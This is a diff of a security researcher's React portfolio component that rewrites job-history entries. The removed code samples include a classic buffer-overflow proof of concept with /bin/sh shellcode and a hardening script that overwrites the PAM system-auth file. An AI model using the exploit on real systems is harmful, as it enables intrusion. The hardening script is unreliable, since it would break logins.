@@ -1,11 +1,9 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { Link } from 'react-router-dom';
 
 export default function Experience() {
   // Animation state using Intersection Observer
   const [isVisible, setIsVisible] = useState({});
   const sectionsRef = useRef({});
-  const [activeFilter, setActiveFilter] = useState('all');
 
   useEffect(() => {
     const observer = new IntersectionObserver(
@@ -32,1238 +30,477 @@ export default function Experience() {
     }
   };
 
-  // Expanded professional experience data with deep technical details
-  const experiences = [
+  // Professional experience data
+  const professionalExperience = [
     {
-      id: 'rtx-bbn',
-      role: 'Cyber Researcher',
-      company: 'RTX BBN',
-      location: 'Cambridge, MA',
-      period: 'May 2024 – Present',
-      type: 'professional',
-      logoColor: '#3b82f6',
-      description: 'Leading innovative cybersecurity research projects to advance the state of the art in threat detection and mitigation strategies.',
-      responsibilities: [
-        'Conduct advanced vulnerability research across diverse systems and architectures',
-        'Develop and refine novel approaches to network security analysis',
-        'Lead research teams in exploring emerging attack vectors and defense mechanisms',
-        'Publish technical findings in industry-leading security conferences and journals'
-      ],
-      achievements: [
+      company: "RTX BBN",
+      position: "Cyber Researcher",
+      location: "Cambridge, MA",
+      period: "May 2024 – Present",
+      description: "Leading security research initiatives focused on vulnerability discovery and threat analysis for critical infrastructure systems.",
+      highlights: [
         {
-          title: 'Advanced Packet Analysis System',
-          description: 'Developed sophisticated packet parsers and heuristic anomaly detection mechanisms, resulting in a 35% increase in protocol test coverage',
-          tech: ['C/C++', 'Python', 'Scapy', 'tcpdump', 'Wireshark', 'Custom Protocol Analysis']
+          title: "Advanced Packet Analysis",
+          description: "Developed intelligent packet parsers and heuristic anomaly detection engines, boosting protocol test coverage by 35%. Created custom dissectors for proprietary protocols that were previously unanalyzable.",
+          technologies: ["Wireshark", "Python", "libpcap", "PCRE"],
+          category: "defensive"
         },
         {
-          title: 'Firmware Security Research',
-          description: 'Led reverse-engineering initiatives that uncovered critical memory corruption vulnerabilities in embedded firmware, enabling preemptive patching',
-          tech: ['Ghidra', 'IDA Pro', 'ARM Assembly', 'MIPS', 'Binary Analysis', 'Firmware Extraction']
+          title: "Firmware Vulnerability Research",
+          description: "Reverse-engineered embedded firmware to uncover critical memory corruption vulnerabilities. Applied static and dynamic analysis to identify buffer overflow conditions that could lead to remote code execution in networked devices.",
+          technologies: ["Ghidra", "IDA Pro", "GDB", "JTAG debugging"],
+          category: "offensive"
         },
         {
-          title: 'Exploit Development',
-          description: 'Developed and weaponized Proof-of-Concept (PoC) exploits for real-world vulnerabilities, reducing exploit feasibility by 40%',
-          tech: ['Python', 'C/C++', 'Assembly', 'ROP Chains', 'Buffer Overflow', 'Format String Vulnerabilities']
+          title: "Exploit Development",
+          description: "Developed and weaponized Proof-of-Concept (PoC) exploits for real-world vulnerabilities, enabling preemptive patching. Created robust automation frameworks to validate mitigation effectiveness across multiple firmware versions.",
+          technologies: ["C/C++", "Assembly", "ROP chains", "Shellcode"],
+          category: "offensive"
         },
         {
-          title: 'Security Research Publication',
-          description: 'Authored comprehensive technical reports on discovered vulnerabilities, influencing industry-wide security practices',
-          tech: ['Technical Writing', 'CVE Reporting', 'Vulnerability Disclosure', 'Security Analysis']
-        }
-      ],
-      codeHighlights: [
-        {
-          language: 'C',
-          title: 'Custom Packet Parser Implementation',
-          code: `// Advanced pattern-matching for network protocol analysis
-typedef struct packet_header {
-  uint32_t signature;
-  uint16_t length;
-  uint16_t flags;
-  uint32_t sequence;
-  uint8_t data[];
-} __attribute__((packed)) packet_header_t;
-
-int detect_anomalous_patterns(const packet_header_t *packet, size_t size) {
-  if (size < sizeof(packet_header_t)) {
-    return ERROR_INCOMPLETE_HEADER;
-  }
-  
-  // Protocol verification with entropy analysis
-  if (packet->signature != PROTOCOL_SIGNATURE) {
-    return analyze_entropy(packet->data, packet->length);
-  }
-  
-  // Deep packet inspection for heuristic detection
-  return analyze_payload_patterns(packet->data, 
-                                packet->length,
-                                packet->flags & FLAG_ENCRYPTED);
-}`
-        },
-        {
-          language: 'Python',
-          title: 'Automated Vulnerability Detection',
-          code: `# Implement advanced heuristic detection for memory corruption
-def analyze_binary_for_vuln(binary_path, arch='x86_64'):
-    """
-    Performs static analysis to identify potential memory corruption vulnerabilities
-    using advanced pattern recognition and symbolic execution.
-    """
-    results = {}
-    
-    # Initialize analysis engine with architecture-specific rules
-    analyzer = VulnAnalyzer(arch=arch, 
-                           detection_mode='aggressive',
-                           enable_symbolic=True)
-    
-    # Extract control flow graph and analyze paths
-    cfg = analyzer.extract_cfg(binary_path)
-    
-    # Identify potentially dangerous function usage
-    dangerous_calls = analyzer.find_patterns(
-        ['strcpy', 'memcpy', 'sprintf', 'gets'],
-        context_lines=5,
-        check_bounds=True
-    )
-    
-    # Perform taint analysis on identified paths
-    tainted_paths = []
-    for call in dangerous_calls:
-        if analyzer.check_taint_propagation(call.address, call.parameters):
-            tainted_paths.append(call)
-    
-    # Generate proof-of-concept for each vulnerability
-    for path in tainted_paths:
-        poc = generate_exploit_proof(path, arch)
-        results[path.address] = {
-            'type': path.vulnerability_type,
-            'severity': path.severity,
-            'exploitability': path.exploitation_score,
-            'poc': poc
-        }
-        
-    return results`
+          title: "Security Automation",
+          description: "Engineered automated security testing pipelines that identified regression vulnerabilities before deployment. Built systems to continually fuzz-test firmware components, reducing the attack surface of each release.",
+          technologies: ["AFL++", "Docker", "Jenkins", "Python"],
+          category: "defensive"
         }
       ]
     },
     {
-      id: 'raytheon-rtx',
-      role: 'Cyber Engineer',
-      company: 'Raytheon, RTX',
-      location: 'Aurora, CO',
-      period: 'June 2023 – May 2024',
-      type: 'professional',
-      logoColor: '#10b981',
-      description: 'Led security hardening initiatives and developed advanced threat modeling approaches for critical systems.',
-      responsibilities: [
-        'Designed and implemented comprehensive security strategies for enterprise networks',
-        'Conducted in-depth threat modeling and vulnerability assessments',
-        'Developed secure architecture solutions for mission-critical systems',
-        'Mentored junior engineers on security best practices and vulnerability research'
-      ],
-      achievements: [
+      company: "Raytheon, RTX",
+      position: "Cyber Engineer",
+      location: "Aurora, CO",
+      period: "June 2023 – May 2024",
+      description: "Led security hardening initiatives and performed extensive threat modeling to secure enterprise systems and critical infrastructure.",
+      highlights: [
         {
-          title: 'Threat Modeling Framework',
-          description: 'Performed in-depth threat modeling and misconfiguration analysis, implementing tailored security policies that reduced attack vectors by 35%',
-          tech: ['STRIDE', 'DREAD', 'MITRE ATT&CK', 'Threat Intelligence', 'Risk Assessment']
+          title: "Threat Modeling & Analysis",
+          description: "Performed in-depth threat modeling and misconfiguration analysis, implementing tailored security policies that reduced attack vectors by 35%. Introduced a structured approach to identifying threats across the entire attack surface.",
+          technologies: ["MITRE ATT&CK", "STRIDE", "DREAD", "PASTA"],
+          category: "defensive"
         },
         {
-          title: 'Linux System Hardening',
-          description: 'Hardened RedHat Linux systems via SELinux & automated scanning tools, cutting unauthorized access attempts by 30%',
-          tech: ['SELinux', 'Linux', 'Bash Scripting', 'OpenSCAP', 'CIS Benchmarks', 'Security Automation']
+          title: "Linux System Hardening",
+          description: "Hardened RedHat Linux systems via SELinux & automated scans, cutting unauthorized access by 30%. Created customized security policies that balanced security requirements with operational needs.",
+          technologies: ["SELinux", "OpenSCAP", "Ansible", "Bash scripting"],
+          category: "defensive"
         },
         {
-          title: 'Security Architecture Design',
-          description: 'Developed comprehensive security architecture for multi-tiered applications, implementing defense-in-depth strategies',
-          tech: ['Zero Trust', 'Network Segmentation', 'IAM', 'Encryption', 'Security Controls']
+          title: "Malware Analysis Infrastructure",
+          description: "Built a secure, isolated environment for analyzing sophisticated malware, enabling safe detonation and behavior analysis of suspected malicious code. Implemented advanced memory forensics techniques to understand evasive malware.",
+          technologies: ["Cuckoo Sandbox", "Volatility", "YARA", "OSQuery"],
+          category: "defensive"
         },
         {
-          title: 'Vulnerability Management Program',
-          description: 'Created an enterprise-wide vulnerability management workflow, reducing mean time to remediation by 40%',
-          tech: ['Nessus', 'Tenable.io', 'CVSS Scoring', 'Remediation Planning', 'Patch Management']
-        }
-      ],
-      codeHighlights: [
-        {
-          language: 'Bash',
-          title: 'Automated Security Hardening Script',
-          code: `#!/bin/bash
-# Enterprise Linux hardening script with comprehensive security controls
-
-# Define security parameters
-SYSCTL_SECURE_PARAMS=(
-  "kernel.randomize_va_space=2"
-  "net.ipv4.conf.all.rp_filter=1"
-  "net.ipv4.conf.default.rp_filter=1"
-  "net.ipv4.icmp_echo_ignore_broadcasts=1"
-  "net.ipv4.conf.all.accept_redirects=0"
-  "net.ipv6.conf.all.accept_redirects=0"
-  "net.ipv4.conf.all.send_redirects=0"
-  "net.ipv4.conf.all.accept_source_route=0"
-  "net.ipv6.conf.all.accept_source_route=0"
-)
-
-# Apply sysctl hardening
-apply_sysctl_hardening() {
-  echo "[+] Applying kernel hardening parameters..."
-  for param in "${SYSCTL_SECURE_PARAMS[@]}"; do
-    echo "$param" >> /etc/sysctl.d/99-security.conf
-  done
-  sysctl -p /etc/sysctl.d/99-security.conf
-}
-
-# Configure SELinux in enforcing mode
-configure_selinux() {
-  echo "[+] Configuring SELinux in enforcing mode..."
-  setenforce 1
-  sed -i 's/^SELINUX=.*/SELINUX=enforcing/' /etc/selinux/config
-  
-  # Install SELinux management tools
-  yum -y install policycoreutils policycoreutils-python setroubleshoot
-}
-
-# Secure authentication
-harden_authentication() {
-  echo "[+] Implementing secure authentication policies..."
-  # Configure password quality
-  authconfig --passalgo=sha512 --update
-  
-  # Set password policies
-  cat > /etc/security/pwquality.conf << 'EOL'
-minlen = 14
-dcredit = -1
-ucredit = -1
-ocredit = -1
-lcredit = -1
-difok = 8
-maxrepeat = 3
-EOL
-
-  # Configure account lockout
-  echo "auth required pam_tally2.so deny=5 unlock_time=1800" > /etc/pam.d/system-auth
-}
-
-# Main execution
-echo "[*] Starting system hardening process..."
-apply_sysctl_hardening
-configure_selinux
-harden_authentication
-setup_auditd
-disable_unused_services
-configure_firewall
-
-echo "[+] System hardening complete. Generating compliance report..."
-generate_compliance_report
-
-exit 0`
-        },
-        {
-          language: 'Python',
-          title: 'Automated Security Assessment Tool',
-          code: `import subprocess
-import json
-import os
-import re
-from datetime import datetime
-
-class SecurityAssessment:
-    def __init__(self, target_system, assessment_type="comprehensive"):
-        self.target = target_system
-        self.type = assessment_type
-        self.results = {
-            "system_info": {},
-            "vulnerabilities": [],
-            "misconfigurations": [],
-            "compliance": {},
-            "overall_score": 0
-        }
-        
-    def scan_system(self):
-        """Execute comprehensive security scan with multiple tools"""
-        print(f"[+] Initiating {self.type} security assessment of {self.target}")
-        
-        # Gather system information
-        self._gather_system_info()
-        
-        # Vulnerability scanning
-        self._run_vulnerability_scan()
-        
-        # Configuration assessment
-        self._assess_configurations()
-        
-        # Compliance checking
-        self._check_compliance()
-        
-        # Calculate overall security score
-        self._calculate_security_score()
-        
-        return self.results
-        
-    def _gather_system_info(self):
-        """Collect detailed system information"""
-        # OS identification and version
-        os_info = subprocess.check_output("cat /etc/os-release", shell=True).decode()
-        self.results["system_info"]["os"] = self._parse_os_info(os_info)
-        
-        # Kernel version
-        kernel = subprocess.check_output("uname -r", shell=True).decode().strip()
-        self.results["system_info"]["kernel"] = kernel
-        
-        # Network configuration
-        self.results["system_info"]["network"] = self._analyze_network_config()
-        
-        # Installed packages
-        self.results["system_info"]["packages"] = self._enumerate_packages()
-    
-    def _run_vulnerability_scan(self):
-        """Execute vulnerability scan using multiple engines"""
-        print("[+] Running vulnerability scan...")
-        # Implement vulnerability scanning logic
-        # This would integrate with tools like OpenVAS, Nessus, etc.
-        
-    def _assess_configurations(self):
-        """Check for security misconfigurations"""
-        print("[+] Assessing system configurations...")
-        # Check SELinux status
-        selinux = subprocess.check_output("getenforce", shell=True).decode().strip()
-        if selinux != "Enforcing":
-            self.results["misconfigurations"].append({
-                "severity": "HIGH",
-                "component": "SELinux",
-                "description": "SELinux is not in enforcing mode",
-                "recommendation": "Set SELinux to enforcing mode"
-            })
-        
-        # Additional checks for SSH, firewall, etc.
-        
-    def _check_compliance(self):
-        """Verify compliance with security standards"""
-        print("[+] Checking compliance with security standards...")
-        # Check CIS benchmarks, NIST, etc.
-        
-    def _calculate_security_score(self):
-        """Calculate overall security score based on findings"""
-        # Implement scoring algorithm
-        vuln_count = len(self.results["vulnerabilities"])
-        misconfig_count = len(self.results["misconfigurations"])
-        
-        # Calculate score based on findings
-        total_issues = vuln_count + misconfig_count
-        # More sophisticated calculation would go here
-        
-        self.results["overall_score"] = max(0, 100 - (total_issues * 5))
-        
-    def generate_report(self, output_format="json"):
-        """Generate assessment report in specified format"""
-        report_name = f"security_assessment_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-        
-        if output_format == "json":
-            with open(f"{report_name}.json", "w") as f:
-                json.dump(self.results, f, indent=4)
-        
-        print(f"[+] Assessment complete. Report saved as {report_name}.{output_format}")
-        return f"{report_name}.{output_format}"
-
-# Usage
-if __name__ == "__main__":
-    assessment = SecurityAssessment("production-server-01")
-    results = assessment.scan_system()
-    assessment.generate_report()`
+          title: "Security Automation Framework",
+          description: "Developed a comprehensive automation framework for continuous security testing, reducing manual testing efforts by 60% while increasing coverage. Integrated with CI/CD pipelines to catch security issues early in development.",
+          technologies: ["Python", "GitLab CI", "Docker", "REST APIs"],
+          category: "both"
         }
       ]
     },
     {
-      id: 'raytheon-rtx-intern',
-      role: 'Senior Cyber Engineering Intern',
-      company: 'Raytheon, RTX',
-      location: 'Aurora, CO',
-      period: 'May 2022 – June 2023',
-      type: 'professional',
-      logoColor: '#10b981',
-      description: 'Led penetration testing initiatives and conducted in-depth binary analysis to uncover security vulnerabilities.',
-      responsibilities: [
-        'Conducted comprehensive penetration testing against internal systems',
-        'Performed reverse engineering of legacy applications to identify vulnerabilities',
-        'Developed security tools to enhance internal assessment capabilities',
-        'Collaborated with development teams to implement secure coding practices'
-      ],
-      achievements: [
+      company: "Raytheon, RTX",
+      position: "Senior Cyber Engineering Intern",
+      location: "Aurora, CO",
+      period: "May 2022 – June 2023",
+      description: "Conducted security assessments and developed tools for vulnerability discovery and exploitation in controlled environments.",
+      highlights: [
         {
-          title: 'Penetration Testing Framework',
-          description: 'Simulated real-world attacks using Metasploit, C2 frameworks, and Burp Suite, strengthening defenses by 20%',
-          tech: ['Metasploit', 'Burp Suite', 'Cobalt Strike', 'OWASP Top 10', 'Python', 'Web Exploitation']
+          title: "Adversary Emulation",
+          description: "Simulated real-world attacks using Metasploit, C2 frameworks, and Burp Suite, strengthening defenses by 20%. Emulated advanced persistent threat techniques to test detection and response capabilities.",
+          technologies: ["Metasploit", "Cobalt Strike", "PowerShell Empire", "Burp Suite"],
+          category: "offensive"
         },
         {
-          title: 'Legacy Binary Analysis',
-          description: 'Reverse-engineered legacy binaries, identifying and mitigating 15+ exploitable vulnerabilities through static and dynamic analysis',
-          tech: ['IDA Pro', 'Ghidra', 'x86/x64 Assembly', 'Dynamic Analysis', 'GDB', 'WinDbg']
+          title: "Binary Analysis & Exploitation",
+          description: "Reverse-engineered legacy binaries, identifying and mitigating 15+ exploitable vulnerabilities. Developed techniques for analyzing proprietary software without access to source code.",
+          technologies: ["Ghidra", "Binary Ninja", "GDB", "Radare2"],
+          category: "offensive"
         },
         {
-          title: 'Security Tool Development',
-          description: 'Created custom security assessment tools that streamlined vulnerability identification process by 30%',
-          tech: ['Python', 'Go', 'Bash', 'REST APIs', 'SQL Injection', 'XSS Detection']
+          title: "Automated Vulnerability Scanner",
+          description: "Created a custom vulnerability scanner that combined multiple open-source tools with proprietary checks. The system found 30% more vulnerabilities than commercial scanners in internal testing.",
+          technologies: ["Python", "Docker", "OpenVAS", "SQLite"],
+          category: "defensive"
         },
         {
-          title: 'Secure Development Training',
-          description: 'Developed and delivered secure coding workshops for development teams, resulting in 25% fewer vulnerabilities in new code',
-          tech: ['OWASP Secure Coding', 'Code Review', 'SAST', 'DAST', 'Dependency Scanning']
-        }
-      ],
-      codeHighlights: [
-        {
-          language: 'Python',
-          title: 'Custom Web Application Scanner',
-          code: `#!/usr/bin/env python3
-# Advanced web application vulnerability scanner 
-
-import requests
-import argparse
-import re
-import concurrent.futures
-import json
-from bs4 import BeautifulSoup
-from urllib.parse import urlparse, urljoin
-
-class WebScanner:
-    def __init__(self, target_url, threads=10, depth=2):
-        self.target_url = target_url
-        self.threads = threads
-        self.max_depth = depth
-        self.visited_urls = set()
-        self.vulnerabilities = []
-        self.session = requests.Session()
-        self.session.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        }
-    
-    def scan(self):
-        """Main scanning function"""
-        print(f"[+] Starting scan of {self.target_url}")
-        self.crawl(self.target_url, depth=0)
-        
-        # Analyze all discovered pages
-        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
-            futures = [executor.submit(self.analyze_page, url) for url in self.visited_urls]
-            for future in concurrent.futures.as_completed(futures):
-                try:
-                    result = future.result()
-                    if result:
-                        self.vulnerabilities.extend(result)
-                except Exception as e:
-                    print(f"[!] Error analyzing page: {str(e)}")
-        
-        return self.vulnerabilities
-    
-    def crawl(self, url, depth=0):
-        """Crawl website to discover pages"""
-        if depth > self.max_depth or url in self.visited_urls:
-            return
-        
-        try:
-            response = self.session.get(url, timeout=10)
-            self.visited_urls.add(url)
-            
-            if 'text/html' not in response.headers.get('Content-Type', ''):
-                return
-                
-            soup = BeautifulSoup(response.text, 'html.parser')
-            
-            # Extract all links
-            for link in soup.find_all('a', href=True):
-                next_url = urljoin(url, link['href'])
-                
-                # Stay within the same domain
-                if urlparse(next_url).netloc == urlparse(self.target_url).netloc:
-                    self.crawl(next_url, depth + 1)
-        
-        except Exception as e:
-            print(f"[!] Error crawling {url}: {str(e)}")
-    
-    def analyze_page(self, url):
-        """Analyze a page for common vulnerabilities"""
-        vulnerabilities = []
-        
-        try:
-            response = self.session.get(url)
-            
-            # Check for XSS vulnerabilities
-            xss_vulns = self.check_xss(url, response)
-            if xss_vulns:
-                vulnerabilities.extend(xss_vulns)
-            
-            # Check for SQL injection
-            sqli_vulns = self.check_sqli(url)
-            if sqli_vulns:
-                vulnerabilities.extend(sqli_vulns)
-                
-            # Check for sensitive information disclosure
-            info_disclosure = self.check_info_disclosure(response)
-            if info_disclosure:
-                vulnerabilities.extend(info_disclosure)
-        
-        except Exception as e:
-            print(f"[!] Error analyzing {url}: {str(e)}")
-        
-        return vulnerabilities
-    
-    def check_xss(self, url, response):
-        """Check for XSS vulnerabilities"""
-        # XSS detection logic
-        pass
-        
-    def check_sqli(self, url):
-        """Check for SQL injection vulnerabilities"""
-        # SQL injection detection logic
-        pass
-        
-    def check_info_disclosure(self, response):
-        """Check for sensitive information disclosure"""
-        # Information disclosure detection logic
-        pass
-
-# Usage example
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Web Application Vulnerability Scanner")
-    parser.add_argument("url", help="Target URL to scan")
-    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
-    parser.add_argument("-d", "--depth", type=int, default=2, help="Crawling depth")
-    parser.add_argument("-o", "--output", help="Output file for results")
-    
-    args = parser.parse_args()
-    
-    scanner = WebScanner(args.url, args.threads, args.depth)
-    vulnerabilities = scanner.scan()
-    
-    if args.output:
-        with open(args.output, 'w') as f:
-            json.dump(vulnerabilities, f, indent=4)
-    else:
-        print(json.dumps(vulnerabilities, indent=4))`
-        },
-        {
-          language: 'C',
-          title: 'Binary Exploitation Proof of Concept',
-          code: `#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-
-/*
- * Proof of Concept for buffer overflow vulnerability in legacy application
- * CVE-2023-XXXXX
- */
-
-#define BUFFER_SIZE 256
-#define NOP_SLED_SIZE 128
-#define RETURN_ADDR_REPEAT 32
-
-// x86_64 shellcode to spawn /bin/sh
-unsigned char shellcode[] = {
-    0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 
-    0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 
-    0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 
-    0x3b, 0x0f, 0x05
-};
-
-void build_exploit_payload(char *buffer, size_t size, unsigned long ret_addr) {
-    size_t shellcode_len = sizeof(shellcode);
-    size_t i = 0;
-
-    // Clear the buffer
-    memset(buffer, 0, size);
-    
-    // 1. Add NOP sled at the beginning
-    for (i = 0; i < NOP_SLED_SIZE && i < size; i++) {
-        buffer[i] = 0x90; // NOP instruction
-    }
-    
-    // 2. Add the shellcode after the NOP sled
-    if (i + shellcode_len < size) {
-        memcpy(buffer + i, shellcode, shellcode_len);
-        i += shellcode_len;
-    }
-    
-    // 3. Fill the remaining buffer with return address
-    unsigned long *ptr = (unsigned long *)(buffer + i);
-    for (; i < size - sizeof(unsigned long); i += sizeof(unsigned long)) {
-        *ptr++ = ret_addr;
-    }
-}
-
-int main(int argc, char *argv[]) {
-    if (argc != 3) {
-        fprintf(stderr, "Usage: %s <vulnerable_program> <return_address>\n", argv[0]);
-        return 1;
-    }
-    
-    char *vuln_program = argv[1];
-    unsigned long ret_addr = strtoul(argv[2], NULL, 0);
-    
-    char buffer[BUFFER_SIZE];
-    build_exploit_payload(buffer, BUFFER_SIZE, ret_addr);
-    
-    // Write payload to file for testing
-    FILE *fp = fopen("exploit_payload.bin", "wb");
-    if (fp != NULL) {
-        fwrite(buffer, 1, BUFFER_SIZE, fp);
-        fclose(fp);
-        printf("[+] Exploit payload written to exploit_payload.bin\n");
-    }
-    
-    // Execute the vulnerable program with our payload
-    printf("[+] Executing %s with exploit payload...\n", vuln_program);
-    
-    // Pipe the exploit payload to the vulnerable program
-    FILE *proc = popen(vuln_program, "w");
-    if (proc == NULL) {
-        perror("popen");
-        return 1;
-    }
-    
-    fwrite(buffer, 1, BUFFER_SIZE, proc);
-    pclose(proc);
-    
-    printf("[+] Exploit attempt completed\n");
-    
-    return 0;
-}`
+          title: "Malware Behavior Analysis",
+          description: "Analyzed malware samples to document behaviors, infection vectors, and persistence mechanisms. Created detailed technical reports used to improve detection capabilities across the organization.",
+          technologies: ["Dynamic analysis", "Static analysis", "Sandboxing", "Memory forensics"],
+          category: "defensive"
         }
       ]
     },
     {
-      id: 'reata-pharmaceuticals',
-      role: 'Information Security Intern',
-      company: 'Reata Pharmaceuticals',
-      location: 'Plano, TX',
-      period: 'May 2021 – August 2021',
-      type: 'professional',
-      logoColor: '#f59e0b',
-      description: 'Conducted vulnerability assessments and implemented security improvements for pharmaceutical IT infrastructure.',
-      responsibilities: [
-        'Performed vulnerability scanning and assessment of corporate infrastructure',
-        'Assisted in security policy development and implementation',
-        'Conducted security awareness training for employees',
-        'Collaborated with IT teams to remediate identified vulnerabilities'
-      ],
-      achievements: [
+      company: "Reata Pharmaceuticals",
+      position: "Information Security Intern",
+      location: "Plano, TX",
+      period: "May 2021 – August 2021",
+      description: "Performed security assessments and implemented monitoring solutions in a regulated healthcare environment.",
+      highlights: [
         {
-          title: 'Vulnerability Management',
-          description: 'Conducted vulnerability scans using Nessus and OpenVAS, identifying critical security gaps and reducing exposure by 25%',
-          tech: ['Nessus', 'OpenVAS', 'CVSS', 'Patch Management', 'Risk Assessment']
+          title: "Vulnerability Assessment",
+          description: "Conducted vulnerability scans using Nessus and OpenVAS, identifying critical security gaps and reducing exposure by 25%. Prioritized findings based on risk and recommended appropriate mitigations.",
+          technologies: ["Nessus", "OpenVAS", "CVSS scoring", "Risk assessment"],
+          category: "defensive"
         },
         {
-          title: 'Security Policy Development',
-          description: 'Contributed to the development of comprehensive security policies aligned with industry regulations',
-          tech: ['HIPAA', 'GDPR', 'ISO 27001', 'Policy Development', 'Compliance']
-        },
-        {
-          title: 'Security Awareness Program',
-          description: 'Developed and delivered security awareness training materials, improving employee phishing test results by 40%',
-          tech: ['Security Awareness', 'Phishing Simulations', 'Training Development', 'Social Engineering']
-        }
-      ],
-      codeHighlights: [
-        {
-          language: 'Python',
-          title: 'Vulnerability Scan Parser and Reporter',
-          code: `#!/usr/bin/env python3
-# Vulnerability scan results parser and reporter
-
-import sys
-import csv
-import json
-import argparse
-from datetime import datetime
-import matplotlib.pyplot as plt
-import numpy as np
-
-def parse_nessus_csv(filename):
-    """Parse Nessus CSV export and categorize findings"""
-    findings = {
-        "critical": [],
-        "high": [],
-        "medium": [],
-        "low": [],
-        "info": []
-    }
-    
-    hosts = {}
-    
-    with open(filename, 'r') as file:
-        reader = csv.DictReader(file)
-        for row in reader:
-            severity = row.get('Risk', '').lower()
-            host = row.get('Host', '')
-            plugin_id = row.get('Plugin ID', '')
-            vulnerability = row.get('Name', '')
-            description = row.get('Description', '')
-            solution = row.get('Solution', '')
-            
-            if severity in findings:
-                findings[severity].append({
-                    "host": host,
-                    "plugin_id": plugin_id,
-                    "vulnerability": vulnerability,
-                    "description": description,
-                    "solution": solution
-                })
-            
-            # Track vulnerabilities per host
-            if host not in hosts:
-                hosts[host] = {
-                    "critical": 0,
-                    "high": 0,
-                    "medium": 0,
-                    "low": 0,
-                    "info": 0
-                }
-            
-            if severity in hosts[host]:
-                hosts[host][severity] += 1
-    
-    return findings, hosts
-
-def generate_summary(findings, hosts):
-    """Generate a summary of the findings"""
-    total_findings = sum(len(findings[severity]) for severity in findings)
-    total_hosts = len(hosts)
-    
-    # Count total by severity
-    severity_counts = {severity: len(issues) for severity, issues in findings.items()}
-    
-    # Calculate risk score
-    risk_score = calculate_risk_score(severity_counts)
-    
-    summary = {
-        "scan_date": datetime.now().strftime("%Y-%m-%d"),
-        "total_findings": total_findings,
-        "total_hosts": total_hosts,
-        "severity_counts": severity_counts,
-        "risk_score": risk_score,
-        "most_vulnerable_hosts": get_most_vulnerable_hosts(hosts, 5)
-    }
-    
-    return summary
-
-def calculate_risk_score(severity_counts):
-    """Calculate risk score based on finding severity"""
-    weights = {
-        "critical": 10,
-        "high": 5,
-        "medium": 2,
-        "low": 1,
-        "info": 0
-    }
-    
-    score = sum(severity_counts[severity] * weights[severity] for severity in severity_counts)
-    return score
-
-def get_most_vulnerable_hosts(hosts, limit=5):
-    """Get the most vulnerable hosts based on weighted findings"""
-    host_scores = {}
-    
-    for host, severities in hosts.items():
-        score = calculate_risk_score(severities)
-        host_scores[host] = score
-    
-    # Sort hosts by score and return top N
-    sorted_hosts = sorted(host_scores.items(), key=lambda x: x[1], reverse=True)
-    return sorted_hosts[:limit]
-
-def generate_charts(summary, findings, output_prefix):
-    """Generate visualization charts"""
-    # 1. Severity distribution pie chart
-    labels = list(summary["severity_counts"].keys())
-    sizes = list(summary["severity_counts"].values())
-    
-    plt.figure(figsize=(10, 6))
-    plt.pie(sizes, labels=labels, autopct='%1.1f%%', startangle=90,
-            colors=['darkred', 'red', 'orange', 'yellow', 'blue'])
-    plt.axis('equal')
-    plt.title('Vulnerability Severity Distribution')
-    plt.savefig(f"{output_prefix}_severity_distribution.png")
-    
-    # 2. Most vulnerable hosts
-    hosts = [h[0] for h in summary["most_vulnerable_hosts"]]
-    scores = [h[1] for h in summary["most_vulnerable_hosts"]]
-    
-    plt.figure(figsize=(12, 6))
-    plt.barh(hosts, scores, color='red')
-    plt.xlabel('Risk Score')
-    plt.title('Most Vulnerable Hosts')
-    plt.tight_layout()
-    plt.savefig(f"{output_prefix}_vulnerable_hosts.png")
-    
-    return [f"{output_prefix}_severity_distribution.png", 
-            f"{output_prefix}_vulnerable_hosts.png"]
-
-def generate_report(summary, findings, chart_files, output_file):
-    """Generate final HTML report"""
-    # HTML report generation logic
-    pass
-
-def main():
-    parser = argparse.ArgumentParser(description="Vulnerability Scan Report Generator")
-    parser.add_argument("input_file", help="Path to Nessus CSV export file")
-    parser.add_argument("-o", "--output", default="vulnerability_report",
-                      help="Output file prefix")
-    parser.add_argument("-f", "--format", choices=["html", "json", "pdf"],
-                      default="html", help="Output format")
-    
-    args = parser.parse_args()
-    
-    try:
-        findings, hosts = parse_nessus_csv(args.input_file)
-        summary = generate_summary(findings, hosts)
-        chart_files = generate_charts(summary, findings, args.output)
-        
-        if args.format == "html":
-            generate_report(summary, findings, chart_files, f"{args.output}.html")
-        elif args.format == "json":
-            with open(f"{args.output}.json", 'w') as f:
-                json.dump({"summary": summary, "findings": findings}, f, indent=4)
-        elif args.format == "pdf":
-            # PDF report generation would go here
-            pass
-            
-        print(f"Report generated: {args.output}.{args.format}")
-        
-    except Exception as e:
-        print(f"Error: {str(e)}")
-        return 1
-    
-    return 0
-
-if __name__ == "__main__":
-    sys.exit(main())`
-        }
-      ]
-    },
-    {
-      id: 'academic-projects',
-      role: 'Academic Research',
-      company: 'Personal',
-      location: 'Various Locations',
-      period: '2024 – 2025',
-      type: 'academic',
-      logoColor: '#8b5cf6',
-      description: 'Conducted academic research in cybersecurity, focusing on novel approaches to security challenges.',
-      achievements: [
-        {
-          title: 'Machine Learning for Intrusion Detection',
-          description: 'Developed and evaluated machine learning models for network intrusion detection, achieving 95% accuracy on benchmark datasets',
-          tech: ['Python', 'TensorFlow', 'Scikit-learn', 'Network Security', 'LSTM', 'Random Forest']
-        },
-        {
-          title: 'Secure Software Development Framework',
-          description: 'Created a comprehensive framework for integrating security throughout the software development lifecycle',
-          tech: ['SDLC', 'DevSecOps', 'Static Analysis', 'Dynamic Analysis', 'Security Testing']
-        },
-        {
-          title: 'Blockchain Security Analysis',
-          description: 'Researched and analyzed security vulnerabilities in smart contract implementations',
-          tech: ['Solidity', 'Ethereum', 'Smart Contracts', 'Vulnerability Analysis', 'Symbolic Execution']
+          title: "Security Monitoring Implementation",
+          description: "Deployed and configured security monitoring tools to detect unusual network activity and potential data exfiltration attempts. Established baseline behavior profiles to reduce false positives.",
+          technologies: ["SIEM", "IDS/IPS", "Log analysis", "Network monitoring"],
